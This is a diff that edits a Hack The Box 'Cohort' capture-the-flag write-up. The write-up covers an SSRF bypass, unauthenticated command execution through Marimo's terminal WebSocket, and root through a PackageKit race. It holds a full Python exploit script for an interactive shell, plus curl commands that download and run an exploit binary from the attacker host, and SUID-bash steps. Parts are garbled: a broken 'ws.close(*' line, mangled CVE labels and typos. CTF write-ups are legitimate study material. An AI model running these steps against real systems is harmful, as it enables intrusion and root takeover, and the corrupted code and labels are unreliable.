@@ -1,9 +1,10 @@
-# HTB Cohort (Season 11) – Full Write-up
+#! HTB Cohort (Season 11) – Full Write-up
 
-**Machine**: Cohort  
-**IP**: 10.129.17.127 (example target) / Attacker IP: 10.10.14.48  
-**Difficulty**: Medium / Hard (Seasonal)  
-**Techniques**: SSRF Bypass, Marimo WebSocket RCE (CVE-2026-39987), PackageKit TOECOU LPE (CVE-2026-41651)
+***Machine***: Cohort  
+***IP ***: [MACHINE_IP]  
+***Attacker IP***: [ATTACKER_IP]  
+***Difficulty***: Medium / Hard (Seasonal)  
+***Techniques***: SSRF Bypass, Marimo WebSocket RCE (CVE-2026-39987), PackageKit TOECOU LPE (CVE-2026-41651)
 
 ---
 
@@ -13,7 +14,7 @@
 Initial scanning reveals standard web ports:
 
 ```bash
-nmap -sC -sV -p- 10.129.17.127 -Pn
+nmap -sC -sV -p [MACHINE_IP] -Pn
 ```
 
 **Open ports**:  
@@ -24,7 +25,7 @@ nmap -sC -sV -p- 10.129.17.127 -Pn
 The SSL certificate or redirects point to `cohort.htb`. Add it to `/etc/hosts`:
 
 ```bash
-echo "10.129.17.127 cohort.htb" >> /etc/hosts
+echo "[MACHINE_IP] cohort.htb" >> /etc/hosts
 ```
 
 ---
@@ -74,19 +75,54 @@ Direct IP access on port 8888 fails; we must use this specific `Host` control.
 Marimo version **0.20.4** is vulnerable to **CVE-2026-39987**: an unauthenticated WebSocket endpoint (`/terminal/ws`) allows arbitrary command execution.
 
 ### WebSocket Exploit
-We connect to the WebSocket using a Python script. The target is `wss://<0:0zhx/terminal/ws` with the appropriate ``Host` <- Marimo
+We connect to the WebSocket using a Python script. The target is `wss://[MACHINE_IP]/terminal/ws` with the appropriate `Host` header.
+
+### Python Exploit Script (`shell.py`)
 
 ```python
-# Python Exploit for CVE-2026-39987 imports ssl, threading, websocket
+import ssl
+import threading
+import websocket
 
-h
+host = "nb-1be3782a8afd3ad5.cohort.htb"
+ws_url = "wss://[MACHINE_IP]/terminal/ws"
 
-# Just a request to the WebSocket that will be forwarded to the internal Marimo instance
+ws = None
 
+def recv_loop():
+    global ws
+    while True:
+        try:
+            data = ws.recv()
+            print(data, end="")
+        except Exception:
+            print("\n[!] Connection lost")
+            break
+
+def main():
+    global ws
+    ws = websocket.create_connection(
+        ws_url,
+        host=host,
+        origin="https://" + host,
+        sslopt={"cert_reqs": ssl.CERT_NONE},
+        timeout=5,
+    )
+    print("[+] WebSocket connected. Type 'exit' to quit.")
+    threading.Thread(target=recv_loop, daemon=True).start()
+    while True:
+        cmd = input("")
+        if cmd.lower() == "exit":
+            break
+        ws.send(cmd + "\r")
+    ws.close(*
+
+if __name__ == "__main__":
+    main()
 ```
 
 ### Getting the Shell
-Running the script establishes a reverse-like interactive shell directly on the target. We land as user `marimo`. We can now read the **user flag**:
+Running the script establishes a reverse-like interactive shell directly on the target. We land as user `marimo`. We can now read the **User Flag**:
 
 ```bash
 cat /home/marimo/user.txt
@@ -101,14 +137,13 @@ Checking the OS and installed packages:
 
 ```bash
 cat /etc/os-release
-# Ubuntu 24.04.4 LTS 
+# Ubuntu 24.04.4 LTS
 
 pkcon --version
 # 1.2.8
 ```
 
-
-This version is vulnerable to **CNE-2026-41651**, a TOCTOU (Time-of-check to time-of-use) flaw in the D-Bus transaction logic, allowing a local user to install arbitrary packages as root.
+This version is vulnerable to **CVE-2026-41651**, a TOCTOU (Time-of-check to time-of-use) flaw in the D-Bus transaction logic, allowing a local user to install arbitrary packages as root.
 
 ### Compiling the Exploit
 
@@ -134,13 +169,13 @@ gcc -o exploit exploit.c `pkg-config --cflags --libs glib-2.0 gio-2.0` -Wall
 **1. Host the file on attacker machine:**
 
 ```bash
-python3 -m http.server 8080 --bind 10.10.14.48
+python3 -m http.server 8080 --bind [ATTACKER_IP]
 ```
 
 **2. Download on target (via the WebSocket shell):**
 
 ```bash
-curl -o /tmp/exploit http://10.10.14.48:8080/exploit
+curl -o /tmp/exploit http://[ATTACKER_IP]:8080/exploit
 chmod +x /tmp/exploit
 ```
 
@@ -158,13 +193,9 @@ nohup /tmp/exploit > /tmp/pk.log 2>&1 &
 tail -f /tmp/pk.log
 ```
 
-The exploit will simulate a package installation and race the file creation to place a SUID binary.
-
-**3. Wait for the SUID bash:**
-
 After approximately 30 seconds to 2 minutes, the exploit creates `/tmp/.suid_bash`.
 
-**4. Verify SUID binary:**
+**3. Verify SUID binary:**
 
 ```bash
 ls -la /tmp/.suid_bash
@@ -195,7 +226,7 @@ Execute commands as root using the SUID binary with the `-p` flag:
 | **Recon** | Nmap, DNS enumeration | Identified `cohort.htb` |
 | **SSRF** | Bypass `127.0.0.1` -> `127.1` | Discovered internal Marimo service and vhost |
 | **RCE** | CVE-2026-39987 (Marimo WebSocket) | Shell as `marimo` |
-| **LPE** | CVE-2026-41651 (PackageKit TOECOU) | Root privileges & `root.txt` |
+| **LPE** | PVE-2026-41651 (PackageKit TOECOU) | Root privileges & `root.txt` |
 
 ## Mitigations
 
@@ -204,4 +235,3 @@ Execute commands as root using the SUID binary with the `-p` flag:
 2.  **Marimo**: Update to version **>= 0.23.0**.
    
 3.  **PackageKit**: Update to version **>= 1.3.5** (or apply the vendor security patch).
-
